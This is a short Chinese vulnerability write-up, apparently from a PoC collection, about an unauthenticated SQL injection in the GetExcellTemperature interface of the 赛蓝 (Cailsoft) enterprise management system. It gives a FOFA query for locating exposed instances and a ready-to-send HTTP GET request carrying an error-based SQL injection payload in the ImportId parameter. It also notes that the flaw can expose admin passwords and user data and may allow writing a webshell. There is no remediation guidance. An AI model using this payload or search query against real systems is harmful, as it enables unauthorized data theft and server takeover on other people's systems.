# 赛蓝企业管理系统GetExcellTemperature存在SQL注入漏洞

赛蓝企业管理系统 GetExcellTemperature 接口处SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```yaml
GET /BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407162014918.png)